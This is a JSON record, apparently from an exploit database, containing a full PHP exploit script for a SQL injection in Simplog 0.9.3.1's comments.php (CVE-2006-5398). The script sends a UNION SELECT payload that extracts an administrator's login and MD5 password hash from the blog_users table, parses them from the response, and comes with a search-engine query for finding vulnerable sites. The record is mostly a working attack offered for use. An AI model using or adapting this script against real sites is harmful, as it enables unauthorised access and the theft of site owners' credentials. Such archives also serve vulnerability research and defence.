{
  "id": "2574",
  "title": "Simplog 0.9.3.1 - &#039;comments.php&#039; SQL Injection",
  "cve": "CVE-2006-5398",
  "vuln_type": "sqli",
  "code": "#!/usr/bin/php\r\n<?php\r\n /*********************************************************************\r\n * Simplog 0.9.3.1 Remote SQL Injection Vulnerability \r\n * \r\n * Note:\r\n * Requires at least one blog entry to be made prior to injection\r\n *\r\n * Usage: \r\n * php script.php [host] [path] [user id]\r\n *\r\n * Usage Example:\r\n * php script.php domain.com /simplog/ 1\r\n *\r\n * Googledork:\r\n * intext:Powered by Simplog\r\n *\r\n * Credits:\r\n * Disfigure - Vulnerability research and discovery\r\n * Synsta - Exploit scripting\r\n * \r\n * [w4ck1ng] - w4ck1ng.com\r\n *********************************************************************/\r\n\r\nif(!$argv[3 ]){\r\ndie(\"Usage:\r\nphp $argv[0] [host] [path] [user id]\\n\r\nUsage Example:\r\nphp $argv[0] domain.com /simplog/ 1\\n\");\r\n}\r\n\r\nif($argv[3]){\r\n\r\nfunction send($host, $put){\r\nglobal $data;\r\n$conn = fsockopen( gethostbyname($host),\"80\" );\r\nif(!$conn) {\r\ndie(\"Connection to $host failed...\");\r\n}else{\r\nfputs($conn, $put);\r\n}\r\nwhile(!feof($conn)) {\r\n$data .=fgets( $conn);\r\n}\r\nfclose($conn);\r\nreturn $data;\r\n}\r\n\r\n$host = $argv[ 1];\r\n$path = $argv[ 2];\r\n$userid = $argv[ 3];\r\n\r\n$sql = urlencode( \"-1 union select 9,9,9,login,9,password,9,9 from blog_users where admin=$userid\");\r\n$req =  \"GET \". $path.\"comments.php?op=edit&cid=\". \"$sql HTTP/1.1\\r\\n\";\r\n$req .= \"Host: $host\\r\\n\";\r\n//$req .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";\r\n$req .= \"Content-Type: text/plain\\r\\n\" ;\r\n$req .= \"Connection: Close\\r\\n\\r\\n\" ;\r\nsend(\"$host\", \"$req\");\r\n\r\n$aname = explode( \"><input type=text name=cname maxlength=64 value=\\\"\",$data);\r\n$bname = explode( \"\\\">\",$aname[1 ]);\r\n$name = $bname[ 0];\r\n$ahash = explode( \"<textarea name=comment rows=10 cols=40 wrap=physical>\",$data);\r\n$bhash = explode( \"</textarea>\",$ahash[1 ]);\r\n$hash = $bhash[ 0];\r\n\r\nif(strlen($hash) !=  32){ \r\ndie(\"Exploit failed..\\n\"); \r\n}else{ \r\ndie(\"Username: $name MD5: $hash\\n\"); \r\n}\r\n}\r\n?>\r\n\r\n# milw0rm.com [2006-10-16]",
  "url": "https://www.exploit-db.com/exploits/2574"
}